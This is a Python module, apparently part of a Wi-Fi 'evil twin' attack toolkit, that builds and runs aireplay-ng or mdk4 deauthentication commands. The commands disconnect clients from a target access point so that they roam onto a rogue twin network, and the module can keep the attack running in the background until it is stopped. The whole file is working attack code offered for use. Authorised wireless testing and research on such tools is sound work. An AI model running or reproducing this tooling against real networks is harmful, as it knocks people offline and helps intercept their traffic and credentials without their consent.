"""Deauthentication module.

Sends deauth frames to disconnect clients from a target AP so they roam onto
the rogue twin. Supports both ``aireplay-ng`` and ``mdk4``. The target BSSID is
required; an optional client MAC limits the blast to a single station.
"""

from __future__ import annotations

import time
from typing import List, Optional

from wifi_evil_twin.utils.system import require_binaries, run


def build_command(
    *,
    monitor_iface: str,
    bssid: str,
    client: str = "",
    packets: int = 0,
    tool: str = "aireplay-ng",
) -> List[str]:
    """Build the deauth command for the chosen tool.

    ``packets=0`` means continuous until the process is killed.
    """
    if tool == "aireplay-ng":
        cmd = ["aireplay-ng", "--deauth", str(packets if packets else 0), "-a", bssid]
        if client:
            cmd += ["-c", client]
        cmd.append(monitor_iface)
        return cmd
    if tool == "mdk4":
        # mdk4 needs a small target list file.
        return ["mdk4", monitor_iface, "d", "-b", bssid]
    raise ValueError(f"unknown deauth tool: {tool}")


def deauth(
    *,
    monitor_iface: str,
    bssid: str,
    client: str = "",
    packets: int = 0,
    tool: str = "aireplay-ng",
    duration: Optional[float] = None,
    dry_run: bool = False,
) -> None:
    """Run a deauth attack, optionally for *duration* seconds."""
    if not dry_run:
        require_binaries([tool])
    cmd = build_command(
        monitor_iface=monitor_iface,
        bssid=bssid,
        client=client,
        packets=packets,
        tool=tool,
    )
    if duration:
        # Run in background, sleep, then the caller is responsible for kill;
        # here we simply run with a timeout to bound it.
        run(cmd, dry_run=dry_run, check=False, timeout=duration)
        return
    run(cmd, dry_run=dry_run, check=False)


def deauth_continuous(
    *,
    monitor_iface: str,
    bssid: str,
    client: str = "",
    tool: str = "aireplay-ng",
    dry_run: bool = False,
):
    """Start deauth as a background subprocess; returns the Popen-like object.

    The caller should ``terminate()`` it when the attack ends.
    """
    if not dry_run:
        require_binaries([tool])
    cmd = build_command(
        monitor_iface=monitor_iface,
        bssid=bssid,
        client=client,
        packets=0,
        tool=tool,
    )
    if dry_run:
        print(f"[dry-run] $ {' '.join(cmd)}  (background, until stopped)")
        return _DummyProc(cmd)
    import subprocess

    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


class _DummyProc:
    """Mimics a Popen for dry-run mode."""

    def __init__(self, cmd: List[str]):
        self.args = cmd
        self.returncode = None

    def terminate(self) -> None:  # pragma: no cover - dry run only
        pass

    def kill(self) -> None:  # pragma: no cover - dry run only
        pass

    def wait(self, timeout: float = 0) -> int:  # pragma: no cover
        return 0
